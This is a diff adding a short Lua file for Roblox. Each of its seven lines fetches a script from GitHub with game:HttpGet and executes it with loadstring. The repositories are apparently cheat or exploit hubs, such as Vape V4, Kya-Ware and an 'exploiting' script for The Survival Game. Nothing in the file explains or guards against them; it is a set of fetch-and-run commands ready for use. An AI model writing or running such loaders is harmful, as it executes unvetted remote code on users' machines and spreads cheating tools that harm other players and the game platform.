@@ -1,0 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/joeengo/exploiting/main/tsg.lua", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Survival808/main/SurvivalGame4"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Survival2/main/GameRoblox"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qxkya/Kya-Ware/main/TheSurvivalGameUPDATEFRIENDLY.lua"))();
+loadstring(game:HttpGet("https://github.com/joeengo/exploiting/blob/main/tsg.lua?raw=true", true))();
